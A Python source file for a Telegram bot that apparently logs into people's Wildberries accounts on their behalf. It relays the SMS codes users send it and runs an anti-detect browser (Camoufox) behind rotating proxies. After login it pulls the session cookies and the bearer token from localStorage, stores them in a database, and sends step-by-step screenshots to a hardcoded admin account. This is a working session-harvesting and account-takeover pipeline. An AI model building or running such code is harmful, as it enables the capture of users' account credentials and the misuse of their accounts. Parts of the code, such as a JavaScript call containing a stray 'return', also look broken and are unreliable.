import datetime
import json
import os
import multiprocessing
import random
import asyncio
import re
import time
import telebot
import asyncpg
import psutil

from camoufox.async_api import AsyncCamoufox


from tasks.check_sms_code import check_sms_code_requests, clear_sms_code
from utils.database.edit_database import clear_db_auth_user
from configuration_bot.settings import config
from utils.selenium_dop_bot_utils.dop_functions_bot import sms_registration, bad_registration, good_registration
from utils.selenium_dop_bot_utils.workers_db_selenium import update_selenium_process_table, update_proxies_status

bot = telebot.TeleBot(config.TG_TOKEN.get_secret_value())

DB_CONFIG = {
    'user': config.PG_USER,
    'password': config.PG_PASSWORD.get_secret_value(),
    'database': config.PG_DB_INTERNAL,
    'host': config.PG_HOST.get_secret_value(),
    'port': config.PG_PORT
}


def parse_time(text):
    # Извлекает время вида 23:34:53 и возвращает timedelta
    match = re.search(r'(\d+):(\d+):(\d+)', text)
    if not match:
        return None
    hours, minutes, seconds = map(int, match.groups())
    return datetime.timedelta(hours=hours, minutes=minutes, seconds=seconds)


def check_sms_block_conditions(page, chat_id):
    """
    Проверяет блокировку на отправку кода и выводит сообщение, если необходимо.
    В этой функции заменён driver на page для Camoufox.
    """
    try:
        # Проверка: "Не прошло время для повторной отправки..."
        span_block = page.query_selector("body > div > div > div > div > form > div > div:nth-child(2) > span:nth-child(2)")
        text = span_block.inner_text().strip()
        if text.startswith("Не прошло время"):
            bot.send_message(chat_id, f"<b>❌ Извините, но для Вас, авторизация временно недоступна.</b> Попробуйте позже.\n\n"
                                      f"<b>Причина: ⏳ {text}</b>", parse_mode="HTML")
            print(f"[{chat_id}] — Ожидание лимита на запрос кода: {text}")
            return False

    except Exception:
        pass

    try:
        countdown_block = page.query_selector("div.login__countdown")
        text = countdown_block.inner_text().strip()
        time_left = parse_time(text)
        if time_left and time_left.total_seconds() > 3600:  # > 1 час
            bot.send_message(chat_id, "<b>❌ Извините, но для Вас, авторизация временно недоступна.</b> Попробуйте позже.\n\n"
                                      "<b>Причина: ⏳ {text}</b>", parse_mode="HTML")
            print(f"[{chat_id}] — Ожидание лимита на запрос кода: {text}")
            return False

    except Exception:
        pass  # Элемент не найден — продолжаем

    return True  # Всё нормально — продолжаем авторизацию


def create_camoufox_processes():
    """
    Создаем процессы Camoufox - для распределения задач.
    """
    process_lst = []
    process_ids = list(range(1, 12))  # Пример 12 процессов
    asyncio.run(update_selenium_process_table(process_ids))

    for process_id in process_ids:
        p = multiprocessing.Process(target=start_camoufox_process, args=(process_id,))
        print(f"Запущен процесс Camoufox-{process_id}, PID: {p.pid}")
        process_lst.append(p)
        p.start()

    for p in process_lst:
        p.join()


def start_camoufox_process(process_id):
    """
    Запускаем Camoufox-процесс.
    """
    time.sleep(random.randint(3, 5))
    print(f'запущен процесс {process_id}')
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(handle_camoufox_loop(process_id))


async def update_last_auth_try_time(chat_id):
    conn = await asyncpg.connect(**DB_CONFIG)
    try:
        existing = await conn.fetchval("SELECT 1 FROM auth_user WHERE chat_id = $1", chat_id)
        if existing:
            await conn.execute("UPDATE auth_user SET last_auth_try_time = now() WHERE chat_id = $1", chat_id)
        else:
            await conn.execute("INSERT INTO auth_user (chat_id, last_auth_try_time) VALUES ($1, now())", chat_id)
        print(f"[{chat_id}] - Обновлено или вставлено поле last_auth_try_time")
    finally:
        await conn.close()


async def handle_camoufox_loop(process_id):
    """
    Запускаем обработчики событий Selenium
    :param process_id:
    :return:
    """
    conn = await asyncpg.connect(**DB_CONFIG)
    try:
        while True:
            chat_data = await conn.fetchrow(f'''
                SELECT chat_id, phone_number, proxy_name, proxy_id, user_agent 
                FROM auth_user 
                WHERE selenium_id = {process_id}
            ''')
            if chat_data:
                chat_id = chat_data["chat_id"]
                phone_number = chat_data["phone_number"]
                proxy_name = chat_data["proxy_name"]
                proxy_id = chat_data["proxy_id"]
                user_agent = chat_data["user_agent"]
                print(f"Успешно пришли данные: chat_id = {chat_id}, proxy = {proxy_name}")
                try:
                    result = WildberriesCamoufoxAuth(
                        process_id, phone_number, chat_id,
                        proxy_name, proxy_id, user_agent
                    )

                    try:
                        auth_result = await result.authorize_user()

                        print(f"Результат: {auth_result}")

                        if auth_result:
                            # Успешная авторизация
                            await good_registration(user_id=chat_id)
                            admin_ids = [687061691]

                            for adm in admin_ids:
                                try:
                                    bot.send_message(adm, f"<b>🔔 Успешно авторизовался пользователь</b>\n\n"
                                                          f"• UserId: {chat_id}\n"
                                                          f"• Phone: {phone_number}", parse_mode="HTML")
                                except Exception as e:
                                    print(f"Ошибка при отправке успешной авторизации Админу: {e}")
                        else:
                            # Ошибка авторизации
                            raise Exception("Авторизация вернула код 500 или None")

                    except Exception as e:
                        print(f"Ошибка авторизации: {e}")
                        await bad_registration(user_id=chat_id, errors=e)
                        await clear_db_auth_user(chat_id)
                        await update_proxies_status(proxy_id)

                except Exception as e:
                    print(f"Ошибка при запуске Selenium-процесса: {e}")
                    await bad_registration(user_id=chat_id, errors=e)
                    await clear_db_auth_user(chat_id)
                    await update_proxies_status(proxy_id)

                await conn.execute(
                    f'UPDATE selenium_process SET is_busy = false WHERE process_id = {process_id}'
                )
                await conn.execute('''
                    UPDATE auth_user SET selenium_id = 0 
                    WHERE selenium_id = $1 AND chat_id = $2 AND phone_number = $3
                ''', process_id, chat_id, phone_number)
            await asyncio.sleep(5)
    finally:
        await conn.close()


class WildberriesCamoufoxAuth:
    """
    Модуль обработчиков событий с использованием Camoufox
    """
    def __init__(self, camoufox_id, phone_number, chat_id, proxy_name, proxy_id, user_agent):
        self.chat_id = chat_id
        self.phone_number = phone_number
        self.camoufox_id = camoufox_id
        self.process_id = camoufox_id
        self.page = None
        self.user_agent = user_agent
        self.proxy_name = proxy_name
        self.code_iteration = 1
        self.user_data_dir = f"/mnt/c/Users/User2/PycharmProjects/ManagersAuthorizationBot/profiles/{self.chat_id}_{self.phone_number}"
        self.profile_name = "Default"
        self.is_authorized = False  # Флаг для проверки, завершена ли авторизация

    async def setup_camoufox(self):
        """
        Настройка браузера Camoufox с cookies, прокси и токеном.
        """
        if self.is_authorized:  # Если авторизация завершена, выходим
            print(f"[{self.chat_id}] Авторизация уже завершена. Пропускаем запуск нового браузера.")
            return None  # Прерываем выполнение

        camoufox_options = {
            "geoip": False,  # Включаем geoip для прокси
            "locale": "ru-RU",
            "humanize": True,
            "headless": False,  # Включаем окно браузера
        }

        # Прокси
        if self.proxy_name:
            proxy_info = self.parse_proxy(self.proxy_name)
            camoufox_options["proxy"] = proxy_info

        try:
            # Запуск браузера с Camoufox
            async with AsyncCamoufox(**camoufox_options, os="windows") as browser:
                context = await browser.new_context()
                self.page = await context.new_page()

                # Добавление cookies для авторизации
                if self.user_agent:
                    await context.add_cookies([{
                        "name": "user_agent",
                        "value": self.user_agent,
                        "domain": "wildberries.ru",
                        "path": "/"
                    }])

                # Навигация на сайт и установка токена
                await self.page.goto(
                    "https://www.wildberries.ru/security/login?returnUrl=https%3A%2F%2Fwww.wildberries.ru%2F")

                await self.page.wait_for_load_state('load')  # Ожидание загрузки страницы
                print(f"[{self.chat_id}] Страница успешно загружена.")

                # Запуск авторизации, если она не была завершена
                if not self.is_authorized:
                    await self.authorize_user()  # Авторизация
                    self.is_authorized = True  # Устанавливаем флаг, что авторизация завершена

                return self.page
        except Exception as e:
            print(f"[{self.chat_id}] Ошибка при открытии сессии: {e}")
            return None

    def parse_proxy(self, proxy: str):
        """Парсинг строки прокси и возвращение структуры для Camoufox."""
        if "@" not in proxy:
            return {"server": proxy}

        creds, host = proxy.split("@")
        user, pwd = creds.split(":")
        host, port = host.split(":")
        return {"server": f"{host}:{port}", "username": user, "password": pwd}

    async def teardown(self):
        """Закрытие браузера Camoufox"""
        try:
            if self.page:
                await self.page.close()
                print(f"[{self.chat_id}] Профиль сохранён: {self.user_data_dir}")
        except Exception as e:
            print(f"[{self.chat_id}] Ошибка при закрытии страницы: {e}")

    async def kill_zombie_chrome(self):
        """Метод для завершения зависших процессов (необходимости в Camoufox нет)"""
        # Camoufox не требует такой функции, так как он использует отдельные процессы для каждого контекста
        print(f"[{self.chat_id}] Не требуется убийство зомби-процессов для Camoufox.")

    async def wait_xpath(self, xpath, timeout=10):
        """Ожидание появления элемента по XPath с использованием Camoufox"""
        try:
            await self.page.wait_for_selector(xpath, timeout=timeout * 1000)  # Переводим в миллисекунды
        except Exception as e:
            print(f"[{self.chat_id}] Ошибка при ожидании элемента: {e}")

    async def check_authorization_initial(self):
        """
        Проверка авторизации перед началом входа.
        Если пользователь уже авторизован — возвращает True.
        Если редиректит на login — возвращает False.
        """
        print('check_authorization (initial)')
        try:
            WB_ORDERS_URL = 'https://www.wildberries.ru/lk/myorders/archive'
            LOGIN_URL = 'https://www.wildberries.ru/security/login'

            # Перехожу на страницу заказов
            await self.page.goto(WB_ORDERS_URL)
            await asyncio.sleep(3)

            current_url = self.page.url
            print(f"[{self.chat_id}] Текущий URL: {current_url}")

            # Проверяем — не редиректнуло ли на login
            if LOGIN_URL in current_url:
                print("Пользователь не авторизован (редирект на страницу входа).")
                return False

            # Если остались в /lk/myorders — проверяем наличие элемента (опционально)
            try:
                element = await self.page.query_selector('//a[contains(text(), "Архив заказов")]')
                if element:
                    print("Пользователь уже авторизован (страница заказов доступна).")
                    return True
            except Exception:
                print("Элемент 'Архив заказов' не найден, но редиректа не было — предполагаем, что авторизация есть.")
                return True

            return True

        except Exception as ex:
            print(f'check_authorization_initial Ошибка: {type(ex).__name__}: {str(ex)}')
            return False

    async def authorize_user(self):
        """Логика авторизации пользователя"""
        print(f"Старт авторизации для chat_id={self.chat_id}")
        page = await self.setup_camoufox()
        if page is None:  # Если браузер не был инициализирован, выходим
            return False

        print(f"[{self.chat_id}] Загружаем страницу...")

        await page.goto("https://www.wildberries.ru/security/login?returnUrl=https%3A%2F%2Fwww.wildberries.ru%2F")
        await self.snapshot("Загрузил страницу")

        if await self.check_authorization_initial():
            print("Пользователь уже авторизован — пропускаем ввод кода.")
            await self.snapshot("Пользователь уже авторизован — пропускаем ввод кода.")

            # Отправляем успешное сообщение и возвращаем результат
            await self.store_auth_success(headers={})
            return True

        try:
            # Вводим номер телефона
            phone_xpath = '//*[@id="inputPhone"]'
            phone_el = await page.query_selector(phone_xpath)
            await phone_el.fill(self.phone_number)
            await phone_el.press("Tab")
            await self.snapshot("Ввел номер телефона")

            # Жмем кнопку "Получить код"
            btn = await page.query_selector("#requestCode")
            await btn.click()
            print(f"[{self.chat_id}] Кнопка 'Получить код' нажата")
            await self.snapshot("Нажал получить код")

            # Ждем, когда появится поле для ввода кода
            await self.await_code_input('//*[@id="spaAuthForm"]//input[contains(@class,"charInputItem")]', self.phone_number)

            # Проверка авторизации
            auth_result = await self.check_authorization()

            if auth_result:
                bot.send_message(self.chat_id, f"<b>Спасибо ☺️</b>\n\n"
                                               f"🟢 Я успешно вошел в Ваш аккаунт.\n\n"
                                               f"<b>Остался последний этап… 🤌</b>", parse_mode="HTML")
                await self.store_auth_success(headers={})
                await self.complete_success()
                return True
            else:
                raise Exception("Ошибка авторизации: не удалось авторизоваться.")

        except Exception as e:
            print(f"ERROR: {e}")
            return False
        finally:
            await self.teardown()

    async def get_cookies_str(self):
        """Получение строкового представления cookies"""
        cookies = await self.page.context.cookies()
        return "; ".join([f"{c['name']}={c['value']}" for c in cookies])

    async def check_authorization(self):
        """
        Проверка авторизации через Camoufox.
        Успех -> остаёмся на https://www.wildberries.ru/lk/myorders/delivery
        Неуспех -> редиректит обратно на login + кнопка "Получить код"
        """
        print('check_authorization (новая логика)')
        try:
            TARGET_URL = "https://www.wildberries.ru/lk/myorders/delivery"
            LOGIN_URL = "https://www.wildberries.ru/security/login"

            # Переход на целевую страницу
            await self.page.goto(TARGET_URL)
            await asyncio.sleep(5)  # ждём редирект, если он будет

            cur_url = self.page.url
            print(f"Текущий URL после проверки: {cur_url}")

            if cur_url.startswith(TARGET_URL):
                print("Пользователь авторизован (остался на delivery).")
                return True

            if cur_url.startswith(LOGIN_URL):
                # Проверяем наличие кнопки "Получить код"
                try:
                    btn = await self.page.query_selector("#requestCode")
                    if btn:
                        print("Авторизация неуспешна: редирект на login + кнопка 'Получить код'")
                        return False
                except Exception:
                    print("Авторизация неуспешна: редирект на login, кнопка не найдена.")
                    return False

            print("Авторизация неуспешна: неизвестное состояние (URL не совпадает).")
            return False

        except Exception as ex:
            print(f'check_authorization Ошибка: {type(ex).__name__}: {str(ex)}')
            return False

    async def store_auth_success(self, headers):
        try:
            # Получаем cookies из страницы
            cookies_str = await self.get_cookies_str()

            # Получаем токен из localStorage через JS
            token_data_raw = await self.page.evaluate('return localStorage.getItem("wbx__tokenData");')
            auth_token = ""
            if token_data_raw:
                try:
                    auth_token = 'Bearer ' + json.loads(token_data_raw).get("token", "")
                except Exception as e:
                    print(f"store_auth_success Ошибка парсинга токена: {e}")

            # Записываем в базу данных
            conn = await asyncpg.connect(**DB_CONFIG)
            try:
                await conn.execute("""
                    UPDATE auth_user SET is_verified = true, cookies = $1, auth_token = $2
                    WHERE chat_id = $3 AND phone_number = $4
                """, cookies_str, auth_token, self.chat_id, self.phone_number)
            finally:
                await conn.close()

            print("store_auth_success Данные успешно записаны в БД")

        except Exception as e:
            print(f"store_auth_success Общая ошибка: {e}")

    async def complete_success(self):
        conn = await asyncpg.connect(**DB_CONFIG)
        try:
            await conn.execute("UPDATE selenium_process SET is_busy = false WHERE process_id = $1", self.process_id)
            await conn.execute("""
                UPDATE auth_user SET selenium_id = 0 
                WHERE selenium_id = $1 AND chat_id = $2 AND phone_number = $3
            """, self.process_id, self.chat_id, self.phone_number)
        finally:
            await conn.close()
        print("Успешная авторизация.")

    async def await_code_input(self, input_xpath: str, phone_number: str):
        """Ожидание ввода кода от пользователя."""
        print("Начал ввода кода")
        max_attempts = 2
        for attempt in range(1, max_attempts + 1):
            print(f"[{self.chat_id}] Попытка {attempt} из {max_attempts}")
            await self.snapshot(f"Старт попытки {attempt}")

            # Отправка первого запроса на код
            sent = await sms_registration(user_id=int(self.chat_id), attempt_number=attempt)
            if not sent:
                print("await_code_input: sms_registration вернуло False")
                return None

            print("Ожидаю ввод кода от пользователя (1 минута)...")
            code = None
            for _ in range(60):  # Ожидаем 1 минуту
                await asyncio.sleep(1)
                try:
                    code = await check_sms_code_requests(user_id=str(self.chat_id))
                    if code:
                        print(f"Получен код: {code}")
                        await clear_sms_code(str(self.chat_id))
                        break
                except Exception as e:
                    print(f"Ошибка check_sms_code_requests: {type(e).__name__}: {e}")
                    continue

            if not code:
                print("Код не получен в течение 60 секунд. Пробуем запросить повторно.")
                bot.send_message(self.chat_id, "<b>⌛ Время ожидания истекло</b>\n\n"
                                               "Я запрошу код повторно, пожалуйста, ожидайте новый код…",
                                 parse_mode="HTML")

                total_seconds = 90  # Ждем 1.5 минуты после повторного запроса

                # Нажимаем "Запросить код повторно"
                await self.request_code_repeat()

                print("Ожидаем новый код (90 секунд)...")
                for _ in range(total_seconds):
                    await asyncio.sleep(1)
                    try:
                        code = await check_sms_code_requests(user_id=str(self.chat_id))
                        if code:
                            print(f"Повторно получен код: {code}")
                            await clear_sms_code(str(self.chat_id))
                            break
                    except Exception as e:
                        print(f"Ошибка check_sms_code_requests (repeat): {type(e).__name__}: {e}")
                        continue
                else:
                    print("Код не пришёл даже после повторного запроса.")
                    bot.send_message(self.chat_id, "❌ Не удалось получить код даже после повторного запроса.")
                    return None

            # Вводим код в поля
            await self.enter_code_into_fields(code)
            return True

    async def request_code_repeat(self):
        """Повторно нажимаем кнопку для запроса кода."""
        repeat_btn = await self.page.query_selector("#requestCode")
        if repeat_btn:
            await repeat_btn.click()
            print("Кнопка 'Запросить код повторно' нажата")
        else:
            print("Ошибка: кнопка 'Запросить код повторно' не найдена.")

    async def enter_code_into_fields(self, code):
        """Вводим код в поля ввода"""
        code = str(code).strip()
        input_fields = await self.page.query_selector_all("#spaAuthForm input.j-b-charinput")

        if len(code) > len(input_fields):
            code = code[:len(input_fields)]

        for el in input_fields:
            try:
                await el.clear()
            except Exception:
                await self.backspace_clear(el)

        for ch, el in zip(code, input_fields):
            await el.fill(ch)
            await asyncio.sleep(0.1)

        # Проверяем, что код введен корректно
        entered = "".join((await el.get_attribute("value") or "") for el in input_fields)[:len(code)]
        if entered != code:
            print(f"Код не совпал: {entered} != {code}")
            await self.snapshot("Ошибка ввода кода")
            return False
        else:
            print("Код успешно введен.")

        return True


    async def backspace_clear(self, el, times: int = 15):
        """Очистка поля с использованием клавиши BACKSPACE"""
        await el.click()
        for _ in range(times):
            await el.press("Backspace")
            await asyncio.sleep(0.02)

    async def snapshot(self, step_name: str):
        timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')

        os.makedirs("screenshots", exist_ok=True)

        filename = f"screenshots/{self.phone_number}_{step_name}_{timestamp}.png"

        await self.page.screenshot(path=filename)

        with open(filename, "rb") as img:
            bot.send_photo(687061691, img, caption=f"{step_name} @ {timestamp}")

        await asyncio.sleep(1)

        try:
            os.remove(filename)
            print(f"[{self.chat_id}] Скриншот {filename} удалён после отправки")
        except Exception as e:
            print(f"[{self.chat_id}] Ошибка при удалении скриншота {filename}: {e}")


if __name__ == "__main__":
    create_camoufox_processes()
